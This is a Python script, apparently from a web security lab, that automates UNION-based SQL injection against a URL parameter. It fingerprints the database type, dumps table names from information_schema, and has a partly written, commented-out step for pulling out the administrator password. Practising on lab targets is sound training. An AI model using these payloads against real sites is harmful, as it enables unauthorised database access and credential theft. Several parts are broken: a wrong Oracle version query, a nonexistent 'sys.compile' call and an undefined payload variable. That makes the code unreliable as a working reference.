import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8087', 'https': 'http://127.0.0.1:8087'}

def database_type(url, uri):
    payload = "' union select null, @@version--"
    res = requests.get(url + uri + payload, verify=False, proxies=proxies)
    Type = ""
    
    if "Microsoft" in res.text or "MySQL" in res.text:
        Type = "MySQL"
    else :
        payload = "' union select null, v@version--"
        res = requests.get(url + uri + payload, verify=False, proxies=proxies)
        
        if "Oracle" in res.text:
            Type = "Oracle"
        else :   
            payload = "' union select null, version()--"
            res = requests.get(url + uri + payload, verify=False, proxies=proxies)
            
            if "PostgreSQL" in res.text:
                Type = "PostgreSQL"
    
    return Type


def get_table_name(url, uri, db_type):
    if "Oracle" == db_type:
        payload = "' union SELECT NULL, table_name FROM information_schema.tables--"
    elif "Microsoft" == db_type or "MySQL" == db_type or "PostgreSQL" == db_type:
        payload = "' union SELECT NULL, table_name FROM information_schema.tables--"
    
    res = requests.get(url + uri + payload, verify=False, proxies=proxies)
    soup = BeautifulSoup(res.text, 'html.parser')
    table_names = [td.get_text() for td in soup.find_all('td')]
    return table_names


def exploit_sqli(url, uri, payload):
    # for elt in payload :
        # if 'user' in payload or 'User' in payload :
    res = requests.get(url + uri + payload, verify=False, proxies=proxies)
    content = res.text
    if "administrator" in res.text:
        soup = BeautifulSoup(res.text, 'html.parser') 
        password_value = soup.find(text=sys.compile(".*administrator."))
        print(password_value)
        return True

    return False

if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
        uri = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <uri>" % sys.argv[0])
        print("[-] Example: %s www.example.com /filter?category=items" % sys.argv[0])
        sys.exit(-1)
    
    db_type = database_type(url, uri)
    table_names = get_table_name(url, uri, db_type)
    print("Database Type:", db_type)
    print("Table Names:", table_names)
    
    # has_password = exploit_sqli(url, uri, payload) 
    # if has_password:
        # print("[-] Can't get the password")
